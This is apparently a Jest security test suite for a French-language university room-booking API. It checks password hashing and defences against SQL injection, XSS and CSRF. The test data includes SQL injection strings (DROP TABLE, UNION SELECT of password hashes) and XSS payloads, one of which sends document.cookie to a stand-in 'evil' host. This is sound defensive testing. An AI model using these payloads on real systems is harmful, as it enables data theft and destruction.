const { resetDb, loginAll, as, request, app, pool, close } = require('../helpers');

beforeAll(async () => {
  await resetDb();
  await loginAll('admin', 'prof1', 'etu1');
});
afterAll(close);

const SQLI = [
  "' OR '1'='1",
  "' OR 1=1 --",
  "admin@fsttanger.ma'--",
  "'; DROP TABLE users; --",
  "' UNION SELECT id, email, password_hash FROM users --",
  '" OR ""="',
];

describe('Authentification & hachage', () => {
  test('mots de passe stockés en bcrypt, jamais exposés', async () => {
    const { rows } = await pool.query('SELECT password_hash FROM users');
    expect(rows.every((r) => /^\$2[aby]\$10\$/.test(r.password_hash))).toBe(true);
    const login = await request(app).post('/api/auth/login').send({ email: 'admin@fsttanger.ma', password: 'Admin@1234' });
    expect(login.status).toBe(200);
    expect(JSON.stringify(login.body)).not.toMatch(/password|\$2[aby]\$/i);
  });

  test('mauvais mot de passe et compte inconnu : même message (pas d\'énumération)', async () => {
    const a = await request(app).post('/api/auth/login').send({ email: 'admin@fsttanger.ma', password: 'faux-mot-de-passe' });
    const b = await request(app).post('/api/auth/login').send({ email: 'inconnu@fsttanger.ma', password: 'faux-mot-de-passe' });
    expect([a.status, b.status]).toEqual([401, 401]);
    expect(a.body.error).toBe(b.body.error);
  });

  test('un mot de passe créé via l\'API est haché et fonctionnel', async () => {
    const r = await as('admin').post('/api/admin/users').send({
      email: 'nouveau@fsttanger.ma', password: 'Secret@1234', nom: 'Nouveau', prenom: 'Prof', role: 'enseignant' });
    expect(r.status).toBe(201);
    expect(r.body.password_hash).toBeUndefined();
    const stored = (await pool.query("SELECT password_hash FROM users WHERE email = 'nouveau@fsttanger.ma'")).rows[0].password_hash;
    expect(stored).not.toContain('Secret@1234');
    expect((await request(app).post('/api/auth/login').send({ email: 'nouveau@fsttanger.ma', password: 'Secret@1234' })).status).toBe(200);
  });

  test('mot de passe trop court refusé', async () => {
    const r = await as('admin').post('/api/admin/users').send({ email: 'x@y.ma', password: '123', nom: 'a', prenom: 'b', role: 'enseignant' });
    expect(r.status).toBe(400);
  });
});

describe('Injection SQL', () => {
  test.each(SQLI)('login avec payload %s => jamais 200', async (payload) => {
    for (const body of [{ email: payload, password: 'x' }, { email: 'admin@fsttanger.ma', password: payload }]) {
      const r = await request(app).post('/api/auth/login').send(body);
      expect([400, 401]).toContain(r.status);
      expect(r.body.token).toBeUndefined();
    }
  });

  test('paramètres d\'URL / de requête injectés => 400, tables intactes', async () => {
    expect((await as('admin').get('/api/admin/cycles/1%20OR%201=1')).status).toBe(400);
    expect((await as('admin').get("/api/admin/users").query({ role: "admin' OR '1'='1" })).status).toBe(400);
    expect((await as('admin').get('/api/admin/journal').query({ limit: '1; DROP TABLE users' })).status).toBe(400);
    expect((await as('prof1').get('/api/salles/disponibilites').query({ debut: "2030-01-01'; DROP TABLE salles;--", fin: '2030-01-02' })).status).toBe(400);
    expect((await pool.query('SELECT count(*)::int AS n FROM users')).rows[0].n).toBeGreaterThan(5);
  });

  test('payload SQL dans un champ texte : stocké comme simple donnée (requêtes paramétrées)', async () => {
    const nom = "Robert'); DROP TABLE users;--";
    const r = await as('admin').post('/api/admin/cycles').send({ nom });
    expect(r.status).toBe(201);
    expect(r.body.nom).toBe(nom);
    expect((await pool.query('SELECT count(*)::int AS n FROM users')).rows[0].n).toBeGreaterThan(5);
    expect((await pool.query('SELECT 1 FROM cycles WHERE nom = $1', [nom])).rowCount).toBe(1);
  });

  test('recherche du code de pointage avec injection => 404, pas d\'erreur serveur', async () => {
    const r = await as('etu1').post('/api/etudiant/pointage').send({ code: "' OR 1=1 --" });
    expect([400, 404]).toContain(r.status);
  });

  test('types inattendus (objets / tableaux au lieu de chaînes) rejetés', async () => {
    expect((await request(app).post('/api/auth/login').send({ email: { $ne: null }, password: { $ne: null } })).status).toBe(400);
    expect((await as('admin').post('/api/admin/cycles').send({ nom: ['a', 'b'] })).status).toBe(400);
    expect((await as('admin').post('/api/admin/salles').send({ nom: 'Z', capacite: '30; DROP TABLE salles' })).status).toBe(400);
  });

  test('aucune erreur 500 ne divulgue de détail SQL', async () => {
    const r = await as('admin').post('/api/admin/salles').send({ nom: 'A'.repeat(500), capacite: 5 });
    expect(r.status).toBe(400);
    expect(JSON.stringify(r.body)).not.toMatch(/postgres|syntax|relation|pg_|select /i);
  });
});

describe('XSS', () => {
  const PAYLOADS = [
    '<script>alert(1)</script>Labo',
    '<img src=x onerror=alert(1)>Labo',
    '<svg/onload=alert(1)>Labo',
    '"><script>alert(document.cookie)</script>Labo',
  ];

  test.each(PAYLOADS)('les balises sont supprimées avant stockage : %s', async (nom) => {
    const r = await as('admin').post('/api/admin/salles').send({ nom: `${nom}${Math.random()}`, capacite: 10 });
    expect(r.status).toBe(201);
    expect(r.body.nom).not.toMatch(/[<>]/);
    expect(r.body.nom).not.toMatch(/script|onerror|onload/i);
    const list = (await as('prof1').get('/api/salles')).body;
    expect(list.some((s) => /[<>]/.test(s.nom))).toBe(false);
  });

  test('XSS dans un compte utilisateur (nom / prénom) neutralisé', async () => {
    const r = await as('admin').post('/api/admin/users').send({
      email: 'xss@fsttanger.ma', password: 'Secret@1234', nom: '<script>alert(1)</script>Dupont', prenom: '<b onmouseover=alert(1)>Jean</b>', role: 'enseignant' });
    expect(r.status).toBe(201);
    expect(r.body.nom).toBe('Dupont');
    expect(r.body.prenom).toBe('Jean');
  });

  test('XSS dans un motif de réservation neutralisé', async () => {
    const r = await as('prof1').post('/api/reservations').send({
      salle_id: 1, debut: new Date(Date.now() + 90 * 864e5).toISOString(), fin: new Date(Date.now() + 90 * 864e5 + 36e5).toISOString(),
      motif: '<script>fetch("//evil/"+document.cookie)</script>Réunion' });
    expect(r.status).toBe(201);
    expect(r.body.motif).toBe('Réunion');
  });

  test('en-têtes de sécurité : CSP, nosniff, pas de X-Powered-By, pas de sniffing', async () => {
    const r = await request(app).get('/api/health');
    expect(r.headers['content-security-policy']).toMatch(/default-src 'none'/);
    expect(r.headers['x-content-type-options']).toBe('nosniff');
    expect(r.headers['x-frame-options']).toBeDefined();
    expect(r.headers['x-powered-by']).toBeUndefined();
    expect(r.headers['content-type']).toMatch(/application\/json/);
  });

  test('les erreurs ne reflètent pas d\'HTML', async () => {
    const r = await request(app).get('/api/%3Cscript%3Ealert(1)%3C%2Fscript%3E');
    expect(r.headers['content-type']).toMatch(/json/);
    expect(JSON.stringify(r.body)).not.toContain('<script>');
  });
});

describe('CSRF', () => {
  const EVIL = 'https://evil.example';
  const GOOD = 'http://localhost:5173';

  test('requête modifiante depuis une origine non autorisée => 403, même avec un jeton valide', async () => {
    const r = await as('admin').post('/api/admin/cycles').set('Origin', EVIL).send({ nom: 'Pirate' });
    expect(r.status).toBe(403);
    expect(r.body.error).toMatch(/CSRF/);
    expect((await pool.query("SELECT 1 FROM cycles WHERE nom = 'Pirate'")).rowCount).toBe(0);
  });

  test.each(['put', 'delete'])('%s depuis une origine non autorisée => 403', async (method) => {
    expect((await as('admin')[method]('/api/admin/cycles/1').set('Origin', EVIL).send({ nom: 'X' })).status).toBe(403);
  });

  test('la même requête depuis l\'origine du front est acceptée', async () => {
    const r = await as('admin').post('/api/admin/cycles').set('Origin', GOOD).send({ nom: 'Légitime' });
    expect(r.status).toBe(201);
  });

  test('l\'authentification ne repose pas sur des cookies : un cookie seul ne suffit pas', async () => {
    const token = as('admin').token;
    const r = await request(app).post('/api/admin/cycles')
      .set('Cookie', [`token=${token}`, `jwt=${token}`, `session=${token}`]).set('Origin', GOOD).send({ nom: 'ViaCookie' });
    expect(r.status).toBe(401);
  });

  test('formulaire HTML cross-site (text/plain, urlencoded) refusé => 415', async () => {
    for (const type of ['text/plain', 'application/x-www-form-urlencoded']) {
      const r = await as('admin').post('/api/admin/cycles').set('Content-Type', type).send('nom=Forge');
      expect(r.status).toBe(415);
    }
    expect((await pool.query("SELECT 1 FROM cycles WHERE nom = 'Forge'")).rowCount).toBe(0);
  });

  test('pré-vol CORS : pas d\'Access-Control-Allow-Origin pour une origine inconnue', async () => {
    const bad = await request(app).options('/api/admin/cycles').set('Origin', EVIL).set('Access-Control-Request-Method', 'POST');
    expect(bad.headers['access-control-allow-origin']).toBeUndefined();
    const ok = await request(app).options('/api/admin/cycles').set('Origin', GOOD).set('Access-Control-Request-Method', 'POST');
    expect(ok.headers['access-control-allow-origin']).toBe(GOOD);
  });
});

describe('Robustesse', () => {
  test('JSON invalide => 400 ; corps trop gros => 413', async () => {
    expect((await request(app).post('/api/auth/login').set('Content-Type', 'application/json').send('{"email": ')).status).toBe(400);
    const big = { email: 'a@b.ma', password: 'x'.repeat(200 * 1024) };
    expect((await request(app).post('/api/auth/login').send(big)).status).toBe(413);
  });

  test('route inconnue => 404 JSON', async () => {
    const r = await as('admin').get('/api/nimporte-quoi');
    expect(r.status).toBe(404);
  });

  test('ID hors limites => 400 (pas de 500)', async () => {
    expect((await as('admin').delete('/api/admin/cycles/99999999999999')).status).toBe(400);
  });
});
